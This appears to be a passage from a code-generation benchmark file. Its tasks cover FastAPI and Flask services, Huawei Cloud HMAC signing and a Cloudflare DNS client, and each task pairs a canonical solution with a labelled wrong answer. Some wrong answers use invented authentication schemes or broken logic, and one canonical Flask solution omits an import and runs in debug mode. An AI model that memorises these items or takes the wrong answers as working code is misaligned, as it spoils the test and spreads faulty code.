numpy arrays\n                masks = [mask.cpu().numpy() for mask in masks]\n\n                return {\"masks\": masks, \"scores\": scores.tolist(), \"logits\": logits.tolist()}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))\n\n        @self.app.post(\"/api/dino/predict\")\n        async def api_dino_predict(payload: DINOPredictRequest) -> Any:\n            try:\n                # Load image\n                image = Image.open(io.BytesIO(payload.image)).convert(\"RGB\")\n                transform = T.Compose([\n                    T.Resize(1024),\n                    T.CenterCrop(1024),\n                    T.ToTensor(),\n                    T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),\n                ])\n                image_tensor = transform(image).unsqueeze(0).to(\"cuda\")\n\n                # Initialize DINO model\n                from dinov2 import predict\n                dino = predict.Dinov2Predictor()\n                dino.model.to(\"cuda\")\n                dino.model.eval()\n\n                # Run prediction\n                with torch.no_grad():\n                    masks, scores = dino.predict(image_tensor)\n\n                # Convert masks to numpy arrays\n                masks = [mask.cpu().numpy() for mask in masks]\n\n                return {\"masks\": masks, \"scores\": scores.tolist()}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))\n\n        @self.app.post(\"/api/dilate/mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest) -> Any:\n            try:\n                # Load image\n                image = Image.open(io.BytesIO(payload.image)).convert(\"RGB\")\n                transform = T.Compose([\n                    T.Resize(1024),\n                    T.CenterCrop(1024),\n                    T.ToTensor(),\n                    T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),\n                ])\n                image_tensor = transform(image).unsqueeze(0).to(\"cuda\")\n\n                # Load mask\n                mask = Image.open(io.BytesIO(payload.mask)).convert(\"L\")\n                mask_tensor = torch.tensor(np.array(mask), dtype=torch.float32).unsqueeze(0).to(\"cuda\")\n\n                # Apply dilation\n                from scipy.ndimage import binary_dilation\n                dilated_mask = binary_dilation(mask_tensor.cpu().numpy(), iterations=payload.dilation_radius)\n\n                # Convert to numpy array\n                dilated_mask = dilated_mask.astype(np.float32)\n\n                return {\"dilated_mask\": dilated_mask.tolist()}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))\n\n        @self.app.post(\"/api/controlnet/seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any:\n            try:\n                # Load image\n                image = Image.open(io.BytesIO(payload.image)).convert(\"RGB\")\n                transform = T.Compose([\n                    T.Resize(1024),\n                    T.CenterCrop(1024),\n                    T.ToTensor(),\n                    T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),\n                ])\n                image_tensor = transform(image).unsqueeze(0).to(\"cuda\")\n\n                # Initialize AutoSAM model\n                autosam = AutoSAM(model_type=autosam_conf.model_type, input_size=autosam_conf.input_size, num_classes=autosam_conf.num_classes, use_ckpt=autosam_conf.use_ckpt, ckpt_path=autosam_conf.ckpt_path, device=autosam_conf.device)\n                autosam.model.to(autosam_conf.device)\n                autosam.model.eval()\n\n                # Run prediction\n                with torch.no_grad():\n                    masks, scores, logits = autosam.predict(image_tensor)\n\n                # Convert masks to numpy arrays\n                masks = [mask.cpu().numpy() for mask in masks]\n\n                return {\"masks\": masks, \"scores\": scores.tolist(), \"logits\": logits.tolist()}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))\n\n        @self.app.post(\"/api/category/mask\")\n        async def api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any:\n            try:\n                # Load image\n                image = Image.open(io.BytesIO(payload.image)).convert(\"RGB\")\n                transform = T.Compose([\n                    T.Resize(1024),\n                    T.CenterCrop(1024),\n                    T.ToTensor(),\n                    T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),\n                ])\n                image_tensor = transform(image).unsqueeze(0).to(\"cuda\")\n\n                # Initialize AutoSAM model\n                autosam = AutoSAM(model_type=autosam_conf.model_type, input_size=autosam_conf.input_size, num_classes=autosam_conf.num_classes, use_ckpt=autosam_conf.use_ckpt, ckpt_path=autosam_conf.ckpt_path, device=autosam_conf.device)\n                autosam.model.to(autosam_conf.device)\n                autosam.model.eval()\n\n                # Run prediction\n                with torch.no_grad():\n                    masks, scores, logits = autosam.predict(image_tensor, category=payload.category)\n\n                # Convert masks to numpy arrays\n                masks = [mask.cpu().numpy() for mask in masks]\n\n                return {\"masks\": masks, \"scores\": scores.tolist(), \"logits\": logits.tolist()}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Create a FastAPI-based service for extracting and citing facts from a given context in response to a user query, using OpenAI's language model for processing and providing streaming responses.\n\nClass Description: ExtractionService is a FastAPI application that handles question-answering with citation extraction. It processes user queries against provided context, extracts facts with proper citations, and streams the results back to the client.\n\nAttributes:\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes\nclient: OpenAI - The OpenAI client configured for structured output using the instructor library\n\nMethods:\n__init__: () -> None - Initializes the FastAPI application and sets up routes\n_setup_routes: () -> None - Configures the API endpoints and their handlers\nextract: (question: Question, openai_key: str) -> StreamingResponse - The endpoint handler that processes extraction requests and returns streaming responses\nstream_extract: (question: Question) -> Iterable[Fact] - Performs the actual extraction using OpenAI's API and yields facts\nget_api_key: (request: Request) -> str - Retrieves the OpenAI API key from either environment variables or request headers",
    "Canonical_solution": "from fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.params import Depends\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom collections.abc import Iterable\nimport json\nimport os\nimport logging\nfrom instructor import OpenAISchema\nfrom instructor.dsl.multitask import MultiTaskBase\nfrom openai import OpenAI\nimport instructor\n\nclient = instructor.from_openai(OpenAI())\nlogger = logging.getLogger(__name__)\n\nclass Fact(BaseModel):\n    fact: str = Field(\n        ...,\n        description=\"Body of the sentences, as part of a response, it should read like a sentence that answers the question\",\n    )\n    substring_quotes: list[str] = Field(\n        ...,\n        description=\"Each source should be a direct quote from the context, as a substring of the original content\",\n    )\n\n    def _get_span(self, quote, context):\n        import regex\n        minor = quote\n        major = context\n        errs_ = 0\n        s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        while s is None and errs_ <= len(context) * 0.05:\n            errs_ += 1\n            s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        if s is not None:\n            yield from s.spans()\n\n    def get_spans(self, context):\n        if self.substring_quotes:\n            for quote in self.substring_quotes:\n                yield from self._get_span(quote, context)\n\nclass QuestionAnswer(OpenAISchema, MultiTaskBase):\n    question: str = Field(..., description=\"Question that was asked\")\n    tasks: list[Fact] = Field(\n        ...,\n        description=\"Body of the answer, each fact should be its separate object with a body and a list of sources\",\n    )\n\nQuestionAnswer.task_type = Fact\n\nclass Question(BaseModel):\n    context: str = Field(..., description=\"Context to extract answers from\")\n    query: str = Field(..., description=\"Question to answer\")\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI(title=\"Citation with Extraction\")\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\", response_class=StreamingResponse)\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            facts = self.stream_extract(question)\n            async def generate():\n                for fact in facts:\n                    logger.info(f\"Fact: {fact}\")\n                    spans = list(fact.get_spans(question.context))\n                    resp = {\n                        \"body\": fact.fact,\n                        \"spans\": spans,\n                        \"citation\": [question.context[a:b] for (a, b) in spans],\n                    }\n                    resp_json = json.dumps(resp)\n                    yield f\"data: {resp_json}\"\n                yield \"data: [DONE]\"\n            return StreamingResponse(generate(), media_type=\"text/event-stream\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        completion = client.chat.completions.create(\n            model=\"gpt-3.5-turbo-0613\",\n            temperature=0,\n            stream=True,\n            functions=[QuestionAnswer.openai_schema],\n            function_call={\"name\": QuestionAnswer.openai_schema[\"name\"]},\n            messages=[\n                {\n                    \"role\": \"system\",\n                    \"content\": \"You are a world class algorithm to answer questions with correct and exact citations.\",\n                },\n                {\"role\": \"user\", \"content\": \"Answer question using the following context\"},\n                {\"role\": \"user\", \"content\": f\"{question.context}\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.query}\"},\n                {\n                    \"role\": \"user\",\n                    \"content\": \"Tips: Make sure to cite your sources, and use the exact words from the context.\",\n                },\n            ],\n            max_tokens=2000,\n        )\n        return QuestionAnswer.from_streaming_response(completion)\n\n    def get_api_key(self, request: Request):\n        if \"OPENAI_API_KEY\" in os.environ:\n            return os.environ[\"OPENAI_API_KEY\"]\n        auth = request.headers.get(\"Authorization\")\n        if auth is None:\n            raise HTTPException(status_code=401, detail=\"Missing Authorization header\")\n        if auth.startswith(\"Bearer \"):\n            return auth.replace(\"Bearer \", \"\")\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, Request\nfrom pydantic import BaseModel\nfrom typing import Iterable, Optional, Dict, Any\nimport os\nimport time\nimport json\nfrom instructor import Instructor, OpenAI\nfrom fastapi.responses import StreamingResponse\n\napp = FastAPI()\n\nclass Question(BaseModel):\n    question: str\n    context: str\n\nclass Fact(BaseModel):\n    text: str\n    citation: str\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = app\n        self.client = OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\")\n        async def extract(question: Question, openai_key: Optional[str] = None):\n            if not openai_key:\n                openai_key = self.get_api_key(request=Request)\n            return StreamingResponse(self.stream_extract(question), media_type=\"application/json\")\n\n    def extract(self, question: Question, openai_key: str) -> StreamingResponse:\n        return StreamingResponse(self.stream_extract(question), media_type=\"application/json\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        prompt = f\"\"\"\n        You are an expert at extracting facts and citations from a given context.\n        For the question \"{question.question}\", extract all relevant facts from the context below and provide proper citations.\n\n        Context:\n        {question.context}\n\n        Please output in the following JSON format:\n        {{\n            \"text\": \"The extracted fact\",\n            \"citation\": \"The citation (e.g., 'Paragraph 3, page 4')\"\n        }}\n        \"\"\"\n        response = self.client.chat.completions.create(\n            model=\"gpt-4\",\n            messages=[{\"role\": \"user\", \"content\": prompt}],\n            stream=True\n        )\n        for chunk in response:\n            if chunk.choices[0].delta.content:\n                yield json.dumps({\"text\": chunk.choices[0].delta.content, \"citation\": \"\"})\n                time.sleep(0.1)\n\n    def get_api_key(self, request: Request) -> str:\n        api_key = request.headers.get(\"Authorization\")\n        if api_key:\n            return api_key\n        return os.getenv(\"OPENAI_API_KEY\")\n\nservice = ExtractionService()\nservice._setup_routes()"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a FastAPI-based action server that can execute predefined actions and list available actions through HTTP endpoints.\n\nClass Description: The ActionServer class initializes a FastAPI application with endpoints for running actions and listing available actions. It uses an action dispatcher to handle the execution of actions.\n\nAttributes:\n- _app: FastAPI - The FastAPI application instance that handles HTTP requests.\n- _action_dispatcher: Any - The dispatcher responsible for executing actions and providing the list of registered actions.\n\nMethods:\n- __init__(action_dispatcher: Any) -> None - Initializes the ActionServer with the given action dispatcher and sets up the FastAPI routes.\n- run_action(body: RequestBody) -> Dict[str, str] - Executes the specified action with the given parameters and returns the result and status.\n- get_actions_list() -> Any - Returns the list of available actions from the action dispatcher.\n- get_app() -> FastAPI - Returns the FastAPI application instance for external use.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom typing import Dict, Optional\n\nclass RequestBody(BaseModel):\n    action_name: str = \"\"\n    action_parameters: Dict = Field(\n        default={}, description=\"The list of action parameters.\"\n    )\n\nclass ResponseBody(BaseModel):\n    status: str = \"success\"\n    result: Optional[str]\n\nclass ActionServer:\n    def __init__(self, action_dispatcher):\n        self._app = FastAPI(\n            title=\"Guardrails Action Server API\",\n            description=\"Guardrails Action Sever API.\",\n            version=\"0.1.0\",\n            license_info={\"name\": \"Apache License, Version 2.0\"},\n        )\n        self._action_dispatcher = action_dispatcher\n\n        self._app.post(\n            \"/v1/actions/run\",\n            summary=\"Execute action\",\n            response_model=ResponseBody,\n        )(self.run_action)\n        self._app.get(\n            \"/v1/actions/list\",\n            summary=\"List available actions\",\n        )(self.get_actions_list)\n\n    async def run_action(self, body: RequestBody):\n        result, status = await self._action_dispatcher.execute_action(\n            body.action_name, body.action_parameters\n        )\n        return {\"status\": status, \"result\": result}\n\n    async def get_actions_list(self):\n        return self._action_dispatcher.get_registered_actions()\n\n    def get_app(self):\n        return self._app",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, HTTPException\nfrom fastapi.responses import JSONResponse\n\nclass ActionServer:\n    def __init__(self, action_dispatcher):\n        self._app = FastAPI()\n        self._action_dispatcher = action_dispatcher\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self._app.post(\"/run-action\")\n        async def run_action(body: dict):\n            action_name = body.get(\"action\")\n            parameters = body.get(\"parameters\", {})\n            try:\n                result = self._action_dispatcher.execute(action_name, parameters)\n                return JSONResponse(content={\"status\": \"success\", \"result\": result})\n            except Exception as e:\n                return JSONResponse(content={\"status\": \"error\", \"message\": str(e)})\n\n        @self._app.get(\"/actions\")\n        async def get_actions_list():\n            actions = self._action_dispatcher.get_actions()\n            return JSONResponse(content={\"actions\": actions})\n\n    def run_action(self, body: dict) -> dict:\n        action_name = body.get(\"action\")\n        parameters = body.get(\"parameters\", {})\n        try:\n            result = self._action_dispatcher.execute(action_name, parameters)\n            return {\"status\": \"success\", \"result\": result}\n        except Exception as e:\n            return {\"status\": \"error\", \"message\": str(e)}\n\n    def get_actions_list(self) -> dict:\n        actions = self._action_dispatcher.get_actions()\n        return {\"actions\": actions}\n\n    def get_app(self) -> FastAPI:\n        return self._app"
  },
  {
    "Task_id": 13,
    "Instruction": "Task Description: Implement an HTTP client function that sends authenticated requests to a Huawei Cloud API endpoint using HMAC-SHA256 signature for authentication.\n\nFunction Description: The function `request` sends HTTP requests to a specified API endpoint with proper authentication headers. It handles request signing, connection management, and response processing. The authentication follows Huawei Cloud's SDK-HMAC-SHA256 algorithm.\n\nInput:\n- `method`: [str] - HTTP method (e.g., 'GET', 'POST')\n- `path`: [str] - API endpoint path\n- `param`: [dict, optional] - Query parameters to be appended to the URL\n- `body`: [str/dict, optional] - Request body content (converted to JSON if dict)\n- `**params`: [dict, optional] - Additional query parameters\n\nOutput:\n- [dict] - Parsed JSON response from the API if successful\n- Raises Exception if HTTP status code indicates failure (status \u2265 300)\n\nNote: The function relies on global configuration in `Config` class (ID, TOKEN, PROXY) and API settings in `API` class (SCHEME, SITE). It performs the following operations:\n1. Constructs proper request headers with timestamp\n2. Generates HMAC-SHA256 signature\n3. Establishes HTTPS connection (with proxy support if configured)\n4. Sends request and processes response\n5. Handles errors and returns parsed data",
    "Canonical_solution": "from hashlib import sha256\nfrom hmac import new as hmac\nfrom binascii import hexlify\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nBasicDateFormat = \"%Y%m%dT%H%M%SZ\"\nAlgorithm = \"SDK-HMAC-SHA256\"\n\nclass Config:\n    ID = \"id\"  # AK\n    TOKEN = \"TOKEN\"  # AS\n    PROXY = None  # \u4ee3\u7406\u8bbe\u7f6e\n    TTL = None\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'dns.myhuaweicloud.com'  # API endpoint\n\ndef request(method, path, param=None, body=None, **params):\n    if param:\n        params.update(param)\n\n    query = urlencode(sorted(params.items()))\n    headers = {\"content-type\": \"application/json\"}\n    headers[\"X-Sdk-Date\"] = datetime.strftime(datetime.utcnow(), BasicDateFormat)\n    headers[\"host\"] = API.SITE\n    sign_headers = []\n    for key in headers:\n        sign_headers.append(key.lower())\n    sign_headers.sort()\n\n    if body is None:\n        body = \"\"\n\n    hex_encode = HexEncodeSHA256Hash(body.encode('utf-8'))\n    canonical_headers = CanonicalHeaders(headers, sign_headers)\n\n    if path[-1] != '/':\n        sign_path = path + \"/\"\n    else:\n        sign_path = path\n\n    canonical_request = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % (method.upper(), sign_path, query,\n                                                    canonical_headers, \";\".join(sign_headers), hex_encode)\n\n    hashed_canonical_request = HexEncodeSHA256Hash(canonical_request.encode('utf-8'))\n    str_to_sign = \"%s\\n%s\\n%s\" % (Algorithm, headers['X-Sdk-Date'], hashed_canonical_request)\n\n    secret = Config.TOKEN\n    signature = hmac(secret.encode('utf-8'), str_to_sign.encode('utf-8'), digestmod=sha256).digest()\n    signature = hexlify(signature).decode()\n    auth_header = \"%s Access=%s, SignedHeaders=%s, Signature=%s\" % (\n        Algorithm, Config.ID, \";\".join(sign_headers), signature)\n    headers['Authorization'] = auth_header\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(method, API.SCHEME + \"://\" + API.SITE + path + '?' + query, body, headers)\n    info(API.SCHEME + \"://\" + API.SITE + path + '?' + query, body)\n    resp = conn.getresponse()\n    data = resp.read().decode('utf8')\n    resp.close()\n    if resp.status < 200 or resp.status >= 300:\n        warning('%s : error[%d]: %s', path, resp.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', path, data)\n        return data\n\ndef HexEncodeSHA256Hash(data):\n    sha = sha256()\n    sha.update(data)\n    return sha.hexdigest()\n\ndef CanonicalHeaders(headers, signed_headers):\n    a = []\n    __headers = {}\n    for key in headers:\n        key_encoded = key.lower()\n        value = headers[key]\n        value_encoded = value.strip()\n        __headers[key_encoded] = value_encoded\n    for key in signed_headers:\n        a.append(key + \":\" + __headers[key])\n    return '\\n'.join(a) + \"\\n\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport hmac\nimport hashlib\nimport time\nimport json\nfrom urllib.parse import urlencode\n\nclass Config:\n    ID = 'your_id'\n    TOKEN = 'your_token'\n    PROXY = 'http://proxy.example.com:8080'\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'api.huaweicloud.com'\n\ndef request(method, path, param=None, body=None, **params):\n    # Combine query parameters\n    query_params = {}\n    if param:\n        query_params.update(param)\n    if params:\n        query_params.update(params)\n    query_string = urlencode(query_params, doseq=True)\n    \n    # Construct request URL\n    url = f\"{API.SCHEME}://{API.SITE}{path}?{query_string}\"\n    \n    # Generate timestamp\n    timestamp = int(time.time() * 1000)\n    \n    # Construct request headers\n    headers = {\n        'Content-Type': 'application/json',\n        'X-Auth-Token': Config.TOKEN,\n        'X-Auth-ID': Config.ID,\n        'X-Timestamp': str(timestamp)\n    }\n    \n    # Handle body\n    if body is not None:\n        if isinstance(body, dict):\n            body = json.dumps(body)\n        headers['Content-Length'] = str(len(body))\n    \n    # Generate signature\n    message = f\"{method}\\n{url}\\n{headers}\\n{body if body else ''}\"\n    secret = Config.TOKEN.encode()\n    signature = hmac.new(secret, message.encode(), hashlib.sha256).hexdigest()\n    headers['X-Signature'] = signature\n    \n    # Set proxy if configured\n    proxies = {}\n    if Config.PROXY:\n        proxies['http'] = Config.PROXY\n        proxies['https'] = Config.PROXY\n    \n    # Send request\n    try:\n        response = requests.request(\n            method=method,\n            url=url,\n            headers=headers,\n            data=body,\n            proxies=proxies\n        )\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException as e:\n        raise Exception(f\"Request failed: {str(e)}\") from e"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a simple Flask web application that serves responses to HTTP requests on different routes.\n\nFunction Description: The application should have two main functions:\n1. A root route handler that returns a welcome message with Python version information\n2. A static file route handler that returns a simple text response\n\nInput:\n- For the root route (\"/\"): No input parameters required\n- For the static route (\"/static/test.txt\"): No input parameters required\n\nOutput:\n- For the root route: A string containing a welcome message with Python version information\n- For the static route: A string containing a static text response",
    "Canonical_solution": "from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@app.route(\"/static/test.txt\")\ndef static_test():\n    return \"Static, from Flask\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, send_file\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    python_version = f\"Python {__import__('sys').version.split()[0]}\"\n    return f\"Welcome to the Flask application! Python version: {python_version}\"\n\n@app.route('/static/test.txt')\ndef static_file():\n    return \"This is a static text response from the Flask application.\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a Python class to interact with Cloudflare's API for managing DNS records, including retrieving zone IDs, listing DNS records, and updating DNS records.\n\nClass Description: The CloudflareAPI class provides methods to interact with Cloudflare's API v4 for DNS management. It handles authentication, request/response processing, and includes caching for DNS records to optimize performance.\n\nAttributes:\n- ID: [str] - Cloudflare account email used for authentication\n- TOKEN: [str] - Cloudflare API key or bearer token for authentication\n- PROXY: [str] - Optional proxy server address\n- TTL: [int] - Time-to-live value for DNS records\n- SITE: [str] - Cloudflare API endpoint (default: \"api.cloudflare.com\")\n- _records_cache: [dict] - Internal cache for storing DNS records to reduce API calls\n\nMethods:\n- _request: [method](method: str, action: str, param: dict=None, **params: dict) -> dict - Internal method to make HTTP requests to Cloudflare API. Handles connection, authentication, request formatting, and response processing.\n- get_zone_id: [method](domain: str) -> str - Retrieves the zone ID for a given domain by checking progressively broader subdomains.\n- get_records: [method](zoneid: str, **conditions: dict) -> dict - Retrieves DNS records matching given conditions from a specified zone, using cache when possible.\n- update_record: [method](domain: str, value: str, record_type: str=\"A\") -> dict - Updates or creates a DNS record for the specified domain with the given value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\n\nclass CloudflareAPI:\n    def __init__(self, auth_email=None, api_key=None, proxy=None, ttl=None):\n        self.ID = auth_email\n        self.TOKEN = api_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.SITE = \"api.cloudflare.com\"\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        if param:\n            params.update(param)\n\n        params = dict((k, params[k]) for k in params if params[k] is not None)\n        info(\"%s/%s : %s\", self.SITE, action, params)\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        if method in ['PUT', 'POST', 'PATCH']:\n            params['content'] = str(params.get('content'))\n            params = jsonencode(params)\n        else:\n            if params:\n                action += '?' + urlencode(params)\n            params = None\n\n        if not self.ID:\n            headers = {\"Content-type\": \"application/json\",\n                      \"Authorization\": \"Bearer \" + self.TOKEN}\n        else:\n            headers = {\"Content-type\": \"application/json\",\n                      \"X-Auth-Email\": self.ID, \"X-Auth-Key\": self.TOKEN}\n\n        conn.request(method, '/client/v4/zones' + action, params, headers)\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', action, response.status, res)\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            debug('%s : result:%s', action, data)\n            if not data:\n                raise Exception(\"Empty Response\")\n            elif data.get('success'):\n                return data.get('result', [{}])\n            else:\n                raise Exception(data.get('errors', [{}]))\n\n    def get_zone_id(self, domain):\n        zoneid = None\n        domain_slice = domain.split('.')\n        index = 2\n        while (not zoneid) and (index <= len(domain_slice)):\n            zones = self._request('GET', '', name='.'.join(domain_slice[-index:]))\n            zone = next((z for z in zones if domain.endswith(z.get('name'))), None)\n            zoneid = zone and zone['id']\n            index += 1\n        return zoneid\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = zoneid + \"_\" + conditions.get('name', \"\") + \"_\" + conditions.get('type', \"\")\n        if cache_key not in self._records_cache:\n            self._records_cache[cache_key] = {}\n            data = self._request('GET', '/' + zoneid + '/dns_records', per_page=100, **conditions)\n            if data:\n                for record in data:\n                    self._records_cache[cache_key][record['id']] = {\n                        'id': record['id'],\n                        'type': record['type'],\n                        'name': record['name'],\n                        'content': record['content'],\n                        'proxied': record['proxied'],\n                        'ttl': record['ttl']\n                    }\n\n        records = {}\n        for (zid, record) in self._records_cache[cache_key].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[zid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        cache_key = zoneid + \"_\" + domain + \"_\" + record_type\n        result = {}\n\n        if records:\n            for (rid, record) in records.items():\n                if record['content'] != value:\n                    res = self._request('PUT', '/' + zoneid + '/dns_records/' + record['id'],\n                                      type=record_type, content=value, name=domain, \n                                      proxied=record['proxied'], ttl=self.TTL)\n                    if res:\n                        self._records_cache[cache_key][rid]['content'] = value\n                        result[rid] = res.get(\"name\")\n                    else:\n                        result[rid] = \"Update fail!\\n\" + str(res)\n                else:\n                    result[rid] = domain\n        else:\n            res = self._request('POST', '/' + zoneid + '/dns_records',\n                              type=record_type, name=domain, content=value, \n                              proxied=False, ttl=self.TTL)\n            if res:\n                self._records_cache[cache_key][res['id']] = res\n                result = res\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class CloudflareAPI:\n    def __init__(self, ID, TOKEN, PROXY=None, TTL=300, SITE=\"api.cloudflare.com\"):\n        self.ID = ID\n        self.TOKEN = TOKEN\n        self.PROXY = PROXY\n        self.TTL = TTL\n        self.SITE = SITE\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        import requests\n        headers = {\n            \"X-Auth-Email\": self.ID,\n            \"X-Auth-Key\": self.TOKEN,\n            \"Content-Type\": \"application/json\"\n        }\n        if self.PROXY:\n            proxies = {\"http\": self.PROXY, \"https\": self.PROXY}\n        else:\n            proxies = None\n        url = f\"https://{self.SITE}/{action}\"\n        if method == \"GET\":\n            response = requests.get(url, params=params, headers=headers, proxies=proxies)\n        elif method == \"POST\":\n            data = param or {}\n            response = requests.post(url, json=data, headers=headers, proxies=proxies)\n        elif method == \"PUT\":\n            data = param or {}\n            response = requests.put(url, json=data, headers=headers, proxies=proxies)\n        elif method == \"DELETE\":\n            response = requests.delete(url, params=params, headers=headers, proxies=proxies)\n        else:\n            return {}\n        if response.status_code != 200:\n            return {}\n        return response.json()\n\n    def get_zone_id(self, domain):\n        domain = domain.rstrip('.')\n        for i in range(1, 256):\n            subdomain = \".\".join([domain] + [\"\"] * i)\n            zone_id = self._request(\"GET\", \"zones\", params={\"name\": subdomain})\n            if zone_id:\n                return zone_id[\"id\"]\n        return \"\"\n\n    def get_records(self, zoneid, **conditions):\n        key = (zoneid, frozenset(conditions.items()))\n        if key in self._records_cache:\n            return self._records_cache[key]\n        records = self._request(\"GET\", \"zones/dns_records\", params={\"zone_id\": zoneid, **conditions})\n        if records:\n            self._records_cache[key] = records\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zone_id = self.get_zone_id(domain)\n        if not zone_id:\n            return {}\n        record = self.get_records(zone_id, name=domain, type=record_type)\n        if record:\n            record_id = record[0][\"id\"]\n            self._request(\"PUT\", \"zones/dns_records\", param={\"id\": record_id, \"type\": record_type, \"name\": domain, \"content\": value, \"ttl\": self.TTL})\n            return {\"status\": \"updated\", \"record\": record[0]}\n        else:\n            self._request(\"POST\", \"zones/dns_records\", param={\"zone_id\": zone_id, \"type\": record_type, \"name\": domain, \"content\": value, \"ttl\": self.TTL})\n            return {\"status\": \"created\", \"record\": self.get_records(zone_id, name=domain, type=record_type)[0]}"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Flask-based HTTP server that manages and controls multiple learner and collector processes, allowing dynamic scaling of these processes through API calls.\n\nClass Description: FlaskOperatorServer is a class that wraps a Flask application to provide RESTful API endpoints for managing learner and collector process replicas. It interacts with a Creator instance to handle the actual process management.\n\nAttributes:\n- app: Flask - The Flask application instance\n- creator: Creator - The process manager that handles learner and collector instances\n- host: str - The host address where the server will run\n- port: int - The port number where the server will listen\n- api_version: str - The version prefix for API endpoints\n\nMethods:\n- __init__(creator, host: str, port: int, api_version: str = 'v1alpha1') -> None - Initializes the Flask server with process manager, host, port, and API version. Sets up route handlers.\n- run() -> None - Starts the Flask application server on the specified host and port.\n- post_replicas() -> dict - Handles POST requests to set the desired number of replicas (route: /{api_version}/replicas). Returns a response dictionary.\n- get_replicas() -> dict - Handles GET requests to retrieve current replica information (route: /{api_version}/replicas). Returns a response dictionary with current resources.",
